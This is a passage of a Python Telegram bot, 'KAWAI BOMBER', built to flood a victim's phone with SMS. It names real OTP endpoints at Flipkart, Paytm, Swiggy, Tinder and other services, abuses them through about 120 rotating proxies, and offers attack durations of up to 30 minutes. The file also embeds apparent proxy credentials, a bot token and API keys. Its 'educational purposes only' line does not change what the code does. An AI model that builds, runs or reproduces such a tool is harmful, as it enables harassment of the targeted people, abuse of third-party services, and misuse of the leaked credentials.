#!/usr/bin/env python3
"""
KAWAI BOMBER - Advanced SMS/Call Bombing Bot
Made with ❤️ by @zerocyph
Real APIs Included for SMS Bombing
Railway Deployment Ready
"""

import asyncio
import json
import random
import logging
import sys
import os
import time
import aiohttp
from datetime import datetime
from typing import Dict, List, Tuple
from collections import defaultdict
from aiohttp import ClientSession, ClientTimeout
import urllib.parse

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

# Telegram Bot Imports
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters
)
from telegram.constants import ParseMode

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8165905656:AAH-rzFBoBCdKMb9A-wv2hx0Hm9RgvGa8m0")
ADMIN_IDS = {8291098446}  # Your user ID

# Webhook settings for Railway
PORT = int(os.environ.get("PORT", 8080))
WEBHOOK_URL = "https://kawai-bomber-production.up.railway.app"
WEBHOOK_PATH = f"/webhook/{BOT_TOKEN}"
WEBHOOK_SECRET = "kawai-bomber-secret-2024"

# Conversation states
PHONE, CONFIRM, BOMB_TYPE, DURATION, COUNTRY_CODE = range(5)

# Anime-inspired emojis
EMOJIS = {
    "bomb": "💣", "phone": "📱", "call": "📞", "sms": "💬", "fire": "🔥",
    "rocket": "🚀", "warning": "⚠️", "success": "✅", "error": "❌",
    "clock": "⏰", "stats": "📊", "admin": "👑", "user": "👤", "ban": "🚫",
    "heart": "❤️", "star": "⭐", "flower": "🌸", "sparkles": "✨",
    "boom": "💥", "shield": "🛡️", "crown": "👑", "tada": "🎉",
    "target": "🎯", "speed": "⚡", "server": "🖥️", "python": "🐍",
    "help": "❓", "activity": "📈", "total": "🔢", "proxy": "🛡️",
    "attack": "⚔️", "victory": "🏁", "dragon": "🐉", "cherry": "🌸",
    "example": "📝", "working": "🟢", "link": "🔗", "cpu": "🖥️",
    "money": "💰", "lock": "🔒", "key": "🔑", "gear": "⚙️",
    "bell": "🔔", "flash": "⚡", "cloud": "☁️", "rainbow": "🌈",
    "ghost": "👻", "alien": "👽", "robot": "🤖", "unicorn": "🦄",
    "flag": "🇮🇳", "global": "🌎", "sms_sent": "📨", "call_made": "📲"
}

# ASCII Art Banner
BANNER = """
╔═══╗╔╗    ╔═══╗╔╗ ╔╗╔════╗╔═══╗╔═══╗╔═══╗
║╔═╗║║║    ║╔══╝║║ ║║╚══╗═║║╔══╝║╔═╗║║╔══╝
║║ ╚╝║║    ║╚══╗║║ ║║  ╔╝╔╝║╚══╗║║ ║║║╚══╗
║║╔═╗║║ ╔╗ ║╔══╝║║ ║║ ╔╝╔╝ ║╔══╝║║ ║║║╔══╝
║╚╩═║║╚═╝║ ║╚══╗║╚═╝║╔╝═╚═╗║╚══╗║╚═╝║║╚══╗
╚═══╝╚═══╝ ╚═══╝╚═══╝╚════╝╚═══╝╚═══╝╚═══╝
"""

# Proxy List (Your provided proxies)
PROXIES = [
    "px711001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043006.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1160303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1400403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px022409.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013304.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px060301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px014236.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px950403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px340403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016008.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1210303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px173003.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px500401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px710701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px041202.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040805.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px580801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px510201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px990502.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px810503.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px210404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px100801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px730503.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px350401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px130501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px380101.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px090404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px220601.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px410701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px052001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1390303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px121102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px220601.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px013302.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px480301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px010702.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490402.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px320702.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px260901.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px241102.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px051703.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px032002.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px410701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px022409.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px051005.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px430403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px012702.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px370505.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px430403.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px241104.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px173007.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px121101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px591203.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px730503.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1210303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px520401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1160303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px570201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px440401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px420602.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px016501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px014004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013301.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px710701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px700403.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px591201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013601.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px331101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px121001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px320705.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px870303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px460101.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px600303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px591701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px460101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043005.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490402.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040706.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px022408.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px060301.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px280301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px380101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px251002.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1330403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px023004.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px480301.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016006.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px580801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px570201.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px510201.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px591801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px300902.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px591801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px023004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px500401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px032004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040805.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px400408.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1260302.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px591201.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px180801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px150902.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px032002.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040706.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px591701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px022505.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px023005.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px140801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px440401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px100801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz"
]

# Real APIs for SMS Bombing (Compiled from your data)
REAL_APIS = {
    "91": [  # India APIs
        {
            "name": "Hungama",
            "method": "POST",
            "url": "https://communication.api.hungama.com/v1/communication/otp",
            "data": {
                "mobileNo": "{target}",
                "countryCode": "+91",
                "appCode": "un",
                "messageId": "1",
                "emailId": "",
                "subject": "Register",
                "priority": "1",
                "device": "web",
                "variant": "v1",
                "templateCode": 1
            },
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Content-Type": "application/json"
            },
            "success_keywords": ["OTP Sent", "success"]
        },
        {
            "name": "Meru Cab",
            "method": "POST",
            "url": "https://merucabapp.com/api/otp/generate",
            "data": {"mobile_number": "{target}"},
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "okhttp/4.9.0"
            },
            "success_keywords": ["success", "sent"]
        },
        {
            "name": "ConfirmTkt",
            "method": "GET",
            "url": "https://securedapi.confirmtkt.com/api/platform/register",
            "params": {"newOtp": "true", "mobileNumber": "{target}"},
            "success_keywords": ["false"]  # API returns "false" on success
        },
        {
            "name": "JustDial",
            "method": "GET",
            "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
            "params": {"mobile": "{target}"},
            "success_keywords": ["sent"]
        },
        {
            "name": "Flipkart",
            "method": "POST",
            "url": "https://www.flipkart.com/api/5/user/otp/generate",
            "data": {"loginId": "+91{target}"},
            "headers": {
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            "success_keywords": ["emailMask"]
        },
        {
            "name": "Paytm",
            "method": "POST",
            "url": "https://commonfront.paytm.com/v4/api/sendsms",
            "data": {"phone": "{target}", "guid": "2952fa812660c58dc160ca6c9894221d"},
            "success_keywords": ["202"]
        },
        {
            "name": "Pharmeasy",
            "method": "POST",
            "url": "https://pharmeasy.in/api/auth/requestOTP",
            "json": {"contactNumber": "{target}"},
            "success_keywords": ["resendSmsCounter"]
        },
        {
            "name": "Swiggy",
            "method": "POST",
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "data": {"mobile": "{target}"},
            "headers": {
                "user-agent": "Swiggy-Android",
                "content-type": "application/json"
            },
            "success_keywords": ["true"]
        },
        {
            "name": "Dream11",
            "method": "POST",
            "url": "https://api.dream11.com/sendsmslink",
            "data": {
                "siteId": "1",
                "mobileNum": "{target}",
                "appType": "androidfull"
            },
            "success_keywords": ["true"]
        },
        {
            "name": "Redbus",
            "method": "GET",
            "url": "https://m.redbus.in/api/getOtp",
            "params": {
                "number": "{target}",
                "cc": "91",
                "whatsAppOpted": "false"
            },
            "success_keywords": ["200"]
        },
        {
            "name": "Unacademy",
            "method": "POST",
            "url": "https://unacademy.com/api/v1/user/get_app_link/",
            "data": {"phone": "{target}"},
            "success_keywords": ["sent"]
        },
        {
            "name": "Ajio",
            "method": "POST",
            "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
            "data": {
                "firstName": "xxps",
                "login": "wiqpdl223@wqew.com",
                "password": "QASpw@1s",
                "genderType": "Male",
                "mobileNumber": "{target}",
                "requestType": "SENDOTP"
            },
            "success_keywords": ["1"]
        },
        {
            "name": "Grofers",
            "method": "POST",
            "url": "https://grofers.com/v2/accounts/",
            "data": {"user_phone": "{target}"},
            "headers": {
                "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
            },
            "success_keywords": ["We have sent"]
        },
        {
            "name": "Airtel",
            "method": "GET",
            "url": "https://www.airtel.in/referral-api/core/notify",
            "params": {"messageId": "map", "rtn": "{target}"},
            "success_keywords": ["Success"]
        },
        {
            "name": "Housing",
            "method": "POST",
            "url": "https://login.housing.com/api/v2/send-otp",
            "data": {"phone": "{target}"},
            "success_keywords": ["Sent"]
        }
    ],
    "multi": [  # Multi-country APIs
        {
            "name": "Tinder",
            "method": "POST",
            "url": "https://api.gotinder.com/v2/auth/sms/send",
            "params": {"auth_type": "sms", "locale": "ru"},
            "data": {"phone_number": "{cc}{target}"},
            "success_keywords": ["200"]
        },
        {
            "name": "ICQ",
            "method": "POST",
            "url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
            "data": {
                "msisdn": "{cc}{target}",
                "locale": "en",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "45559"
            },
            "success_keywords": ["200"]
        },
        {
            "name": "MailRu",
            "method": "POST",
            "url": "https://cloud.mail.ru//api/v2/notify/applink",
            "data": {
                "phone": "+{cc}{target}",
                "api": "2",
                "email": "email",
                "x-email": "x-email"
            },
            "success_keywords": ["200"]
        }
    ]
}

# ==================== GLOBAL VARIABLES ====================
active_attacks = {}
user_statistics = defaultdict(lambda: {
    "sms_count": 0,
    "call_count": 0,
    "total_sessions": 0,
    "last_active": datetime.now(),
    "total_hits": 0,
    "total_attacks": 0
})
bot_statistics = {
    "total_users": 0,
    "active_attacks": 0,
    "total_sms_sent": 0,
    "total_calls_made": 0,
    "total_sessions": 0,
    "total_hits": 0,
    "bot_uptime": datetime.now()
}

# ==================== REAL BOMBING ENGINE ====================
class RealAttackEngine:
    def __init__(self, target_number, country_code, user_id, attack_type="sms", duration=5):
        self.target = target_number
        self.country_code = country_code
        self.user_id = user_id
        self.attack_type = attack_type
        self.duration = duration
        self.is_running = False
        self.success_count = 0
        self.failed_count = 0
        self.start_time = None
        self.task = None
        self.session = None
        
    def format_proxy(self, proxy_str):
        """Format proxy string to aiohttp format"""
        try:
            parts = proxy_str.split(':')
            if len(parts) >= 4:
                host, port, username, password = parts[:4]
                return f"http://{username}:{password}@{host}:{port}"
        except:
            pass
        return None
    
    async def send_single_request(self, api, proxy_url=None):
        """Send a single request to an API"""
        try:
            # Prepare data
            url = api["url"]
            
            # Replace placeholders
            target_placeholder = api.get("target_placeholder", "{target}")
            cc_placeholder = api.get("cc_placeholder", "{cc}")
            
            url = url.replace(target_placeholder, self.target)
            url = url.replace(cc_placeholder, self.country_code)
            
            headers = api.get("headers", {}).copy()
            for key, value in headers.items():
                if isinstance(value, str):
                    headers[key] = value.replace(target_placeholder, self.target).replace(cc_placeholder, self.country_code)
            
            # Prepare request data
            request_data = {}
            
            if api["method"] == "POST":
                if "json" in api:
                    json_data = api["json"].copy()
                    # Replace placeholders in JSON
                    for key, value in json_data.items():
                        if isinstance(value, str):
                            json_data[key] = value.replace(target_placeholder, self.target).replace(cc_placeholder, self.country_code)
                    request_data["json"] = json_data
                elif "data" in api:
                    if isinstance(api["data"], dict):
                        form_data = api["data"].copy()
                        # Replace placeholders in form data
                        for key, value in form_data.items():
                            if isinstance(value, str):
                                form_data[key] = value.replace(target_placeholder, self.target).replace(cc_placeholder, self.country_code)
                        
                        if headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                            # Convert dict to form-urlencoded
                            request_data["data"] = urllib.parse.urlencode(form_data)
                        else:
                            request_data["data"] = form_data
            elif api["method"] == "GET" and "params" in api:
                params = api["params"].copy()
                # Replace placeholders in params
                for key, value in params.items():
                    if isinstance(value, str):
                        params[key] = value.replace(target_placeholder, self.target).replace(cc_placeholder, self.country_code)
                request_data["params"] = params
            
            # Send request
            timeout = ClientTimeout(total=10)
            
            if proxy_url:
                request_data["proxy"] = proxy_url
            
            async with self.session.request(
                method=api["method"],
                url=url,
                headers=headers,
                timeout=timeout,
                ssl=False,
                **request_data
            ) as response:
                response_text = await response.text()
                status_code = response.status
                
                # Check if successful
                success = False
                if 200 <= status_code < 300:
                    # Check for success keywords
                    for keyword in api.get("success_keywords", []):
                        if keyword.lower() in response_text.lower():
                            success = True
                            break
                
                return success, api["name"], status_code
                
        except Exception as e:
            logger.error(f"Request error for {api.get('name', 'Unknown')}: {e}")
            return False, api.get("name", "Unknown"), 0
    
    async def launch_attack(self):
        """Launch the real SMS bombing attack"""
        self.is_running = True
        self.start_time = datetime.now()
        
        # Register attack
        active_attacks[self.user_id] = self
        bot_statistics["active_attacks"] = len(active_attacks)
        
        # Update user stats
        user_statistics[self.user_id]["total_attacks"] += 1
        user_statistics[self.user_id]["last_active"] = datetime.now()
        
        # Get APIs for the country
        apis = REAL_APIS.get(self.country_code, []) + REAL_APIS.get("multi", [])
        
        if not apis:
            logger.error(f"No APIs found for country code {self.country_code}")
            return False
        
        logger.info(f"Starting attack with {len(apis)} APIs for {self.duration} minutes")
        
        # Start attack task
        self.task = asyncio.create_task(self._attack_loop(apis))
        return True
    
    async def _attack_loop(self, apis):
        """Main attack loop"""
        end_time = datetime.now().timestamp() + (self.duration * 60)
        request_count = 0
        
        # Create session
        self.session = ClientSession()
        
        try:
            while self.is_running and datetime.now().timestamp() < end_time:
                # Shuffle APIs for each round
                random.shuffle(apis)
                
                # Prepare tasks for this round
                tasks = []
                for api in apis[:10]:  # Limit to 10 APIs per round
                    # Get random proxy
                    proxy_str = random.choice(PROXIES)
                    proxy_url = self.format_proxy(proxy_str)
                    
                    task = self.send_single_request(api, proxy_url)
                    tasks.append(task)
                
                # Execute all requests concurrently
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Process results
                for result in results:
                    if isinstance(result, Exception):
                        self.failed_count += 1
                        continue
                    
                    success, api_name, status_code = result
                    if success:
                        self.success_count += 1
                        user_statistics[self.user_id]["sms_count"] += 1
                        bot_statistics["total_sms_sent"] += 1
                        user_statistics[self.user_id]["total_hits"] += 1
                        bot_statistics["total_hits"] += 1
                    else:
                        self.failed_count += 1
                
                request_count += len(tasks)
                
                # Log progress every 10 requests
                if request_count % 10 == 0:
                    elapsed = datetime.now().timestamp() - self.start_time.timestamp()
                    logger.info(f"Attack progress: {self.success_count} successes, {self.failed_count} fails, {elapsed:.1f}s elapsed")
                
                # Small delay between rounds
                await asyncio.sleep(0.5)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Attack loop error: {e}")
        finally:
            # Close session
            if self.session and not self.session.closed:
                await self.session.close()
            self.stop_attack()
    
    def stop_attack(self):
        """Stop the attack"""
        self.is_running = False
        if self.user_id in active_attacks:
            del active_attacks[self.user_id]
            bot_statistics["active_attacks"] = len(active_attacks)
        
        if self.task and not self.task.done():
            self.task.cancel()
    
    def get_stats(self):
        """Get current attack statistics"""
        if not self.start_time:
            return {}
        
        elapsed = int((datetime.now() - self.start_time).total_seconds())
        return {
            "target": self.target,
            "country_code": self.country_code,
            "type": self.attack_type,
            "duration": self.duration,
            "elapsed": elapsed,
            "success": self.success_count,
            "failed": self.failed_count,
            "total": self.success_count + self.failed_count,
            "status": "running" if self.is_running else "stopped"
        }

# ==================== TELEGRAM BOT HANDLERS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    # Initialize user stats if new
    if user_id not in user_statistics:
        bot_statistics["total_users"] += 1
    
    user_statistics[user_id]["last_active"] = datetime.now()
    user_statistics[user_id]["total_sessions"] += 1
    bot_statistics["total_sessions"] += 1
    
    welcome_message = f"""
{EMOJIS['sparkles']} <b>KAWAI BOMBER v4.0</b> {EMOJIS['sparkles']}

{EMOJIS['flower']} Welcome <b>@{username}</b> to Kawai Bomber!

{EMOJIS['fire']} <b>Features:</b>
• {EMOJIS['sms']} <b>REAL SMS Bombing</b> (15+ APIs)
• {EMOJIS['proxy']} <b>{len(PROXIES)} Rotating Proxies</b>
• {EMOJIS['speed']} <b>Fast & Efficient</b>
• {EMOJIS['shield']} <b>Auto Proxy Rotation</b>
• {EMOJIS['global']} <b>Multi-Country Support</b>

{EMOJIS['star']} <b>Commands:</b>
• /bomb - Start SMS bombing attack
• /stop - Stop current attack
• /status - Bot statistics
• /mystats - Your statistics
• /help - Help guide

{EMOJIS['warning']} <b>Important:</b>
• For educational purposes only
• Don't abuse the service
• Respect privacy laws

{EMOJIS['heart']} <b>Made by:</b> @zerocyph
"""
    
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['bomb']} Start Attack", callback_data="start_attack"),
            InlineKeyboardButton(f"{EMOJIS['stats']} My Stats", callback_data="my_stats")
        ],
        [
            InlineKeyboardButton(f"{EMOJIS['help']} Help", callback_data="show_help"),
            InlineKeyboardButton(f"{EMOJIS['status']} Bot Status", callback_data="bot_status")
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return ConversationHandler.END

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /bomb command - start bombing process"""
    user_id = update.effective_user.id
    
    # Check if user already has active attack
    if user_id in active_attacks:
        stats = active_attacks[user_id].get_stats()
        await update.message.reply_text(
            f"{EMOJIS['warning']} <b>You already have an active attack!</b>\n\n"
            f"{EMOJIS['target']} Target: {stats.get('target', 'N/A')}\n"
            f"{EMOJIS['flag']} Country: +{stats.get('country_code', 'N/A')}\n"
            f"{EMOJIS['clock']} Elapsed: {stats.get('elapsed', 0)} seconds\n"
            f"{EMOJIS['success']} Success: {stats.get('success', 0)} hits\n\n"
            f"Use /stop to stop current attack first.",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    # Ask for country code
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['flag']} India (+91)", callback_data="cc_91"),
            InlineKeyboardButton(f"{EMOJIS['global']} Other", callback_data="cc_other")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"{EMOJIS['global']} <b>Select Country Code:</b>\n\n"
        f"{EMOJIS['example']} Default is India (+91)\n"
        f"{EMOJIS['warning']} Currently only India (+91) has full API support",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return COUNTRY_CODE

async def country_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle country code selection"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "cc_91":
        context.user_data["country_code"] = "91"
        await query.edit_message_text(
            f"{EMOJIS['success']} <b>Country Code:</b> +91 (India)\n\n"
            f"{EMOJIS['phone']} <b>Enter phone number (10 digits):</b>\n\n"
            f"{EMOJIS['example']} Example: <code>9876543210</code>\n"
            f"{EMOJIS['warning']} Don't include +91 or 0",
            parse_mode=ParseMode.HTML
        )
        return PHONE
    else:
        # For other countries, ask for country code
        await query.edit_message_text(
            f"{EMOJIS['global']} <b>Enter country code:</b>\n\n"
            f"{EMOJIS['example']} Example: For USA enter <code>1</code>\n"
            f"{EMOJIS['warning']} Only numbers, without +",
            parse_mode=ParseMode.HTML
        )
        return PHONE

async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number input"""
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        phone = query.data
    else:
        phone = update.message.text.strip()
    
    # Store phone in context
    context.user_data["phone"] = phone
    
    # Get country code (default to 91 if not set)
    country_code = context.user_data.get("country_code", "91")
    
    # Validate phone number
    if not phone.isdigit():
        await update.message.reply_text(
            f"{EMOJIS['error']} <b>Invalid phone number!</b>\n\n"
            f"Please enter digits only.\n"
            f"Example: <code>9876543210</code>",
            parse_mode=ParseMode.HTML
        )
        return PHONE
    
    if country_code == "91" and len(phone) != 10:
        await update.message.reply_text(
            f"{EMOJIS['error']} <b>Invalid phone number!</b>\n\n"
            f"Indian numbers must be 10 digits.\n"
            f"Example: <code>9876543210</code>",
            parse_mode=ParseMode.HTML
        )
        return PHONE
    
    # Ask for duration
    keyboard = [
        [
            InlineKeyboardButton(f"1 min {EMOJIS['clock']}", callback_data="dur_1"),
            InlineKeyboardButton(f"5 min {EMOJIS['fire']}", callback_data="dur_5"),
            InlineKeyboardButton(f"10 min {EMOJIS['boom']}", callback_data="dur_10")
        ],
        [
            InlineKeyboardButton(f"15 min {EMOJIS['dragon']}", callback_data="dur_15"),
            InlineKeyboardButton(f"30 min {EMOJIS['alien']}", callback_data="dur_30")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"{EMOJIS['success']} <b>Phone:</b> +{country_code} {phone}\n\n"
        f"{EMOJIS['clock']} <b>Select attack duration:</b>\n\n"
        f"{EMOJIS['warning']} Longer duration = More SMS sent\n"
        f"{EMOJIS['sms']} Estimated SMS: 10-30 per minute",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return DURATION

async def duration_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle duration selection"""
    query = update.callback_query
    await query.answer()
    
    # Parse duration from callback data
    dur_str = query.data.replace("dur_", "")
    duration = int(dur_str)
    context.user_data["duration"] = duration
    
    phone = context.user_data["phone"]
    country_code = context.user_data.get("country_code", "91")
    
    # Calculate estimated hits
    estimated_hits = duration * 20  # ~20 requests per minute
    
    # Confirmation keyboard
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['success']} LAUNCH ATTACK", callback_data="confirm_yes"),
            InlineKeyboardButton(f"{EMOJIS['error']} CANCEL", callback_data="confirm_no")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
